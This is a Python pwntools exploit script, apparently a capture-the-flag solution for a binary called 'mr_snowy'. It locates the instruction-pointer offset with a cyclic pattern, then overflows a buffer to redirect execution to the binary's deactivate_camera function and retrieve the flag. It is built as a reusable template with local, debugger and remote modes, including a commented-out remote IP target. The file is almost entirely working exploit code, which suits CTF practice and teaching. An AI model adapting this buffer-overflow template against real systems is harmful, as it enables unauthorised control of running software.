from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './mr_snowy'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

#print(elf.functions)

# Start program
io = process()
#io = remote('209.97.142.217', 30977) <- for running the exploit remotely and getting the flag from the target

rop = ROP(elf)

#pprint(rop.gadgets)

# Build the payload
payload = flat (
    {offset: elf.functions.deactivate_camera}
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>', payload)

# Got Shell?
io.interactive()

# Or, Get our flag!
flag = io.recv()
#print(flag)
success(flag)
